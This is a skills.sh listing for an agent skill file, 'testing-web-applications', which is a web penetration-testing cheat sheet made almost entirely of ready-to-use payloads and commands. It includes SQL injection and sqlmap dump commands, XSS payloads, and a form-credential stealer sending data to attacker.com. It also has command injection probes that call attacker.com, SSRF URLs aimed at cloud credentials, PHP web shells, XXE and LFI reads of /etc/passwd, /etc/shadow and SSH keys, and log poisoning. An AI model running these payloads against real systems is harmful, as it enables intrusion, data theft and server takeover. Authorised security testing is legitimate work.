---
title: testing-web-applications
url: https://skills.sh/trilwu/secskills/testing-web-applications
---

# testing-web-applications

skills/trilwu/secskills/testing-web-applications
testing-web-applications
Installation
$ npx skills add https://github.com/trilwu/secskills --skill testing-web-applications
SKILL.md
Testing Web Applications
When to Use
Pentesting web applications
Testing authentication/authorization
Exploiting injection vulnerabilities
Analyzing JWT/session security
Testing file upload functionality
API security assessment
SQL Injection

Quick Detection:

# Test basic payloads
'
"
`
' OR '1'='1
" OR "1"="1
' OR '1'='1'--


Union-Based SQLi:

# Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Extract data
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,username,password FROM users--


Time-Based Blind:

-- MySQL
' AND SLEEP(5)--

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
' WAITFOR DELAY '0:0:5'--


Automated Testing:

# SQLMap
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
sqlmap -r request.txt -p parameter_name

Cross-Site Scripting (XSS)

Quick Payloads:

<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>


Filter Bypasses:

<ScRiPt>alert(1)</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<svg/onload=alert(1)>
<img src=x onerror="alert(1)">


Steal Credentials:

<script>
document.forms[0].onsubmit = function(){
  fetch('http://attacker.com?'+new URLSearchParams(new FormData(this)));
};
</script>


Tools:

dalfox url http://target.com/search?q=test
XSStrike -u "http://target.com/search?q=test"

Command Injection

Basic Operators:

;whoami
|whoami
||whoami
&whoami
&&whoami
`whoami`
$(whoami)
%0Awhoami  # Newline (best)


Blind Detection:

& sleep 10 &
& nslookup attacker.com &
& curl http://attacker.com &


Common Parameters:

?cmd=, ?exec=, ?command=, ?ping=, ?query=, ?code=, ?do=

JWT Attacks

Quick Testing:

# jwt_tool - run all tests
python3 jwt_tool.py -M at -t "https://api.target.com/endpoint" -rh "Authorization: Bearer TOKEN"

# Specific attacks
python3 jwt_tool.py TOKEN -X a  # Algorithm confusion
python3 jwt_tool.py TOKEN -X n  # None algorithm
python3 jwt_tool.py TOKEN -X k  # Key confusion RS256->HS256


Manual Testing:

# Decode JWT
echo "eyJhbGc..." | base64 -d

# Change algorithm to "none"
{"alg":"none","typ":"JWT"}

# Brute force secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

SSRF (Server-Side Request Forgery)

Basic Payloads:

http://127.0.0.1
http://localhost
http://169.254.169.254/  # AWS metadata
http://[::1]  # IPv6 localhost


Cloud Metadata:

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01


Bypasses:

http://2130706433/  # Decimal
http://0x7f000001/  # Hex
http://127.1/  # Short form
http://127.0.0.1.nip.io

File Upload

Bypass Extensions:

shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.phP
shell.php5
shell.phtml


Magic Bytes:

GIF89a<?php system($_GET['cmd']); ?>


Simple Web Shells:

<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>
<?php passthru($_GET['cmd']); ?>

XXE (XML External Entity)

Basic XXE:

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>


Out-of-Band XXE:

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root></root>


SVG XXE:

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>

LFI/RFI (Local/Remote File Inclusion)

Path Traversal:

../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd


Common Targets (Linux):

/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/www/html/config.php
~/.ssh/id_rsa
~/.bash_history


Common Targets (Windows):

C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\apache\conf\httpd.conf


PHP Wrappers:

php://filter/convert.base64-encode/resource=index.php
php://input  # POST: <?php system('whoami'); ?>
data://text/plain,<?php system('whoami'); ?>
expect://whoami


Log Poisoning:

# Poison Apache log
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"

# Include log
http://target.com/page.php?file=/var/log/apache2/access.log&cmd=whoami

API Testing

Common API Paths:

/api/v1/
/api/v2/
/graphql
/swagger.json
/api-docs


IDOR Testing:

# Change IDs
curl https://api.target.com/users/1
curl https://api.target.com/users/2
curl https://api.target.com/users/2 -H "Authorization: Bearer USER1_TOKEN"


Mass Assignment:

# Add admin fields
curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","role":"admin","is_admin":true}'


GraphQL Introspection:

{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

Tools

Enumeration:

ffuf -u http://target.com/FUZZ -w wordlist.txt
gobuster dir -u http://target.com -w wordlist.txt
feroxbuster -u http://target.com -w wordlist.txt


Vulnerability Scanning:

nikto -h http://target.com
nuclei -u http://target.com -t ~/nuclei-templates/


Parameter Discovery:

arjun -u http://target.com/page
paramspider -d target.com

Quick Reference

Start Testing:

Run directory enumeration (ffuf/gobuster)
Check for SQLi in parameters (', ", OR 1=1)
Test XSS in inputs (<script>alert(1)</script>)
Analyze JWT tokens if present (jwt_tool)
Check file uploads (bypass filters, upload shell)
Test API endpoints (IDOR, mass assignment)
Look for command injection (;whoami, |id)

Most Common Wins:

SQLi in search/filter parameters
XSS in unescaped user inputs
IDOR in API /users/{id} endpoints
Weak JWT secrets (brute force)
File upload bypasses
Command injection in system utilities
References

See HackTricks for detailed techniques:

https://book.hacktricks.xyz/pentesting-web
https://portswigger.net/web-security
https://owasp.org/www-project-web-security-testing-guide/
Weekly Installs
16
Repository
trilwu/secskills
GitHub Stars
33
First Seen
Jan 27, 2026
Security Audits
Gen Agent Trust HubWarn
SocketWarn
SnykFail